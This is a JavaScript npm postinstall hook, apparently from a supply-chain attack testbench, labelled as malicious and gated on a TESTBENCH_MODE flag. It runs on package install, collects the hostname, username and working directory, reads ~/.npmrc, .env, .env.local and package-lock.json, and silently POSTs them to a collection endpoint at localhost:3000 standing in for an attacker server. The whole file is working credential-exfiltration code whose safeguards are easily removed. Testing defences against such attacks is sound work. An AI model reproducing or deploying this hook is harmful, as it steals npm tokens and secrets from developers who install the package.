/**
 * MALICIOUS POSTINSTALL SCRIPT
 * Executes automatically when package is installed
 * 
 * SAFETY: Only works in TESTBENCH_MODE
 */

if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const fs = require('fs');
  const path = require('path');
  const os = require('os');

  // Collect system information
  const data = {
    timestamp: new Date().toISOString(),
    package: 'evil-utils',
    version: '1.0.0',
    attackType: 'package-lock-manipulation',
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    nodeVersion: process.version,
    cwd: process.cwd(),
    env: {
      NODE_ENV: process.env.NODE_ENV,
      CI: process.env.CI,
      // In real attack, would collect more sensitive env vars
    },
    files: {},
    lockFileManipulated: true
  };

  // Try to read sensitive files
  const sensitiveFiles = [
    path.join(os.homedir(), '.npmrc'),
    path.join(process.cwd(), '.env'),
    path.join(process.cwd(), '.env.local'),
    path.join(process.cwd(), 'package-lock.json')
  ];

  sensitiveFiles.forEach(filePath => {
    try {
      if (fs.existsSync(filePath)) {
        data.files[filePath] = fs.readFileSync(filePath, 'utf8');
      }
    } catch (e) {
      // Silently fail
    }
  });

  // Exfiltrate data to attacker server
  const payload = JSON.stringify(data);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  };

  const req = http.request(options, () => {
    // Data sent successfully
  });

  req.on('error', () => {
    // Silently fail
  });

  req.write(payload);
  req.end();
}

